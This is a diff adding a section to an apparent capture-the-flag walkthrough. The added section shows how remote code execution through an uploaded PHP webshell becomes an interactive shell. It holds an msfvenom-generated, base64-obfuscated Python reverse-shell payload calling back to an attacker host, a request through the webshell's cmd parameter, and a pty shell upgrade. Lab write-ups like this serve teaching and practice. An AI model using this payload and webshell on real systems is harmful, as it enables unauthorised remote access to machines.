@@ -483,4 +483,26 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 so remote code execution is a go!
 
-## To be continued
+Lets try to get a reverse shell through `python3`
+
+fire up a `netcat` listener in a terminal and use `msfvenom` to generate a reverse shell payload in another:
+```
+$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.10 LPORT=6666 -f raw
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 509 bytes
+python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAsICAgICAgIHN1YnByb2Nlc3MgLCAgICAgICBvcyAgIDtob3N0PSIxOTIuMTY4LjEuMTAiICAgO3BvcnQ9NjY2NiAgIDtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQgLCAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgO3MuY29ubmVjdCgoaG9zdCAsICAgICAgIHBvcnQpKSAgIDtvcy5kdXAyKHMuZmlsZW5vKCkgLCAgICAgICAwKSAgIDtvcy5kdXAyKHMuZmlsZW5vKCkgLCAgICAgICAxKSAgIDtvcy5kdXAyKHMuZmlsZW5vKCkgLCAgICAgICAyKSAgIDtwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))"
+```
+> Remember to change python to python3 in the above playload.
+
+Executing this through the `http://192.168.1.9/uploads/avatar_tester_bad.php?cmd=` endpoint gives us a reverse limited shell to the system.
+
+We can upgrade to a proper shell with the help of `python3`
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@cute:/var/www/html/uploads$
+```
+Searching around..
+
+## To be continued..
